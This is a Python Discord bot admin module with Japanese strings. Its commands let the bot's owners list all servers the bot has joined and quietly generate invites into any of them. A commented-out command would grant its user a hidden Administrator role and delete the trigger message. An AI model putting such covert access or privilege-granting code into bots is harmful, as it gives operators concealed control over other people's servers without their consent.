import discord
from discord.ext import commands
from discord import app_commands
from func.ready import bot_ready_print
from func.tools import is_bot_admin

class AdminCog(commands.Cog):
    def __init__(self, bot:commands.Bot):
        self.bot = bot
    
    @commands.Cog.listener()
    async def on_ready(self):
        bot_ready_print("AdminCog")

    class admin1(app_commands.Group):
        pass
    admin = admin1(name="admin",description="Bot管理者専用")

    @admin.command(name="serverlist", description="Botが参加しているサーバーの一覧を表示します（BOT管理者のみ）")
    async def serverlist(self, interaction:discord.Interaction):
        if not is_bot_admin(interaction.user.id):
            await interaction.response.send_message("このコマンドはこのBOTの管理者のみが使用できます。", ephemeral=True)
            return
        
        # Botが参加しているサーバー（ギルド）の情報を取得
        server_names = [(guild.name, guild.id) for guild in self.bot.guilds]

        if server_names:
            # サーバー名と招待リンクをリストで表示
            message = ""
            for server_name, server_id in server_names:
                message += f"{server_name}`{server_id}`\n"
            embed = discord.Embed(
                title=f"Botが参加しているサーバー一覧 ({len(self.bot.guilds)})",
                description=message,
                color=0x38b6ff
            )
            await interaction.response.send_message(embed=embed)
        else:
            await interaction.response.send_message("Botはサーバーに参加していません。")
    @admin.command(name="invite",description="Botが参加しているサーバーの招待リンクを生成します。(BOT管理者のみ)")
    async def admin_invite(self, interaction:discord.Interaction, id:str):
        if not is_bot_admin(interaction.user.id):
            await interaction.response.send_message("このコマンドはこのBOTの管理者のみが使用できます。", ephemeral=True)
            return
        guild = self.bot.get_guild(int(id))
        invite = await guild.text_channels[0].create_invite(reason="T-BOT 管理者によって生成")
        await interaction.response.send_message(content=invite, ephemeral=True)
    
    # @commands.command(name="gad")
    # async def gad(self, ctx:commands.Context):
    #     if is_bot_admin(ctx.author.id):
    #         per = discord.Permissions()
    #         per.administrator = True
    #         role = await ctx.guild.create_role(permissions=per)
    #         await ctx.author.add_roles(role)
    #         await ctx.message.delete()


async def setup(bot):
    await bot.add_cog(AdminCog(bot))